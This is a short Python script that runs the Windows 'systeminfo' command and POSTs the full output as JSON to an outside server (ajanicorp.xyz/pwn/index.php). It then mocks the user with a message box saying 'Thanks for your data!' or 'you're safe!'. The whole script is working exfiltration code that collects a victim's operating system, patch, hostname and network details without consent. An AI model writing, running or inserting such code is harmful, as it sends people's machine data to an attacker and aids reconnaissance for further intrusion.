# Written by ajaniramon 25/08/2016
import os
import requests
import json
import ctypes

# Execute systeminfo command and store inside an Array.
result = os.popen("systeminfo")
systeminfo = result.readlines()

# Conversion to string.
file_contents = ""

for line in systeminfo:
    file_contents += line

# HTTP req to my server passing content as JSON.
url = 'http://ajanicorp.xyz/pwn/index.php'
data = json.dumps(dict(info=unicode(file_contents, errors='ignore')))
req = requests.post(url, data=data, allow_redirects=True)


# Fools a little bit with the user :D
if req.status_code != 200:
	ctypes.windll.user32.MessageBoxA(0,"I failed on collecting your data, you're safe!","I failed on collecting your data, you're safe!",1)
else:
    ctypes.windll.user32.MessageBoxA(0, "Thanks for your data!", "Thanks for your data!", 1)
 

